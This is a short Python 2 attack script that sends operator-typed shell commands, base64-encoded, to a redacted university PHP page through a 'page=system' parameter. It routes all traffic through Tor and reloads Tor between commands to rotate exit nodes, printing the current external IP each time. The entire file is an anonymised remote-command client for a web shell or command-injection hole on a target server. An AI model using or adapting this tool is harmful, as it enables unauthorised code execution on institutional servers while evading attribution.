#!/usr/bin/env python
# -*- coding: utf-8 -*-

__DATE__ = 'XXX.XXX.2016'
__AUTHOR__ = 'cemonatk'

from urllib2 import Request,urlopen
import socks,socket
from subprocess import Popen,PIPE,call
from time import sleep
from base64 import b64encode

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
socket.socket = socks.socksocket

site = 'http://XXX.edu.XXX/web/XXX/XXX.php'

def check_tor():
	if ' * tor is running\n' == Popen('sudo service tor status', universal_newlines=True,shell=True, stdout=PIPE,stderr=PIPE).stdout.read():
		call('sudo service tor restart', shell=True)
	else:
		call('sudo service tor start', shell=True)

def tor_reload():
	try:
		call('sudo service tor reload', shell=True)
	except:
		print "Can't changed the Tor node, checking tor status and starting if doesn't working..."
		check_tor()
		
def post(cmd):
	cmd = b64encode(cmd)
	data = 'page=c3lzdGVt&date=%s' % (cmd)
	request = Request(site, data)
	return urlopen(request).read()
	
while True:
	tor_reload()
	command = str(raw_input("Enter Command:\n"))
	print post(command)
	print urlopen("https://myexternalip.com/raw").read()